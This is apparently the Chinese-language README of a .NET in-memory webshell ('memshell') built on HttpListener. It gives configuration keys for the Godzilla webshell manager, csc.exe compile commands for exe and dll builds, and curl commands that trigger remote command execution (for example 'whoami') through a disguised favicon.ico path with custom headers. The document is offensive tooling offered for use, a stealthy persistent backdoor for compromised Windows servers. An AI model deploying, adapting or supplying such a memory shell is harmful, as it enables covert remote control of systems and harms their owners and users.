# Memshell-HttpListener
## 说明

代码中需要修改的点
```
input_key  为Godzilla 里面的key
pass       为Godzilla 里面的pass
nodata     为自定义返回404的代码的base64字符串
```

另外如果需要报错log，可将log部分注释去掉查看。


## 编译
**exe**
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /r:System.Web.dll,System.dll,Microsoft.CSharp.dll,System.Core.dll memshell.cs
```
**dll**
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /r:System.Web.dll,System.dll,Microsoft.CSharp.dll,System.Core.dll /t:library memshell.cs
```

## 使用
使用方式可参考：[DotNet内存马-HttpListener](https://mp.weixin.qq.com/s/zsPPkhCZ8mhiFZ8sAohw6w)

**验证：**
```
curl http://10.211.55.4/favicon.ico -H "Type: print"
```
![](../assets/16384159078389.jpg)

**命令执行：**
```
curl http://10.211.55.4/favicon.ico -H "Type: cmd"  -d "pass=whoami"
```
![](../assets/16384159397039.jpg)

**Godzilla**
添加对应HTTP头即可，
AES_RAW

![](../assets/16384242085416.jpg)

AES_BASE64

![](../assets/16384242790653.jpg)




